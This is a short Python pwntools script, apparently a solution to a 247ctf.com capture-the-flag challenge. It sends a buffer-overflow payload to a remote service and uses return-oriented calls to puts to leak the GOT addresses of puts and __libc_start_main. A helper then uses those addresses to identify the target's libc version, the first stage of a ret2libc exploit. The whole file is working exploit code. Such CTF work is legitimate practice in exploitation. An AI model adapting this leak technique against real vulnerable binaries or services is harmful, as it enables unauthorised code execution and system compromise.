from pwn import *

import TheNight

import sys

target = remote("6c1e79c5ca0b9cfb.247ctf.com", 50270)
payload = ""
payload += "0000000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p32(0x8048410)
payload += p32(0x8048410)
payload += p32(0x804a018)
payload += p32(0x804a01c)
target.sendline(payload)
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
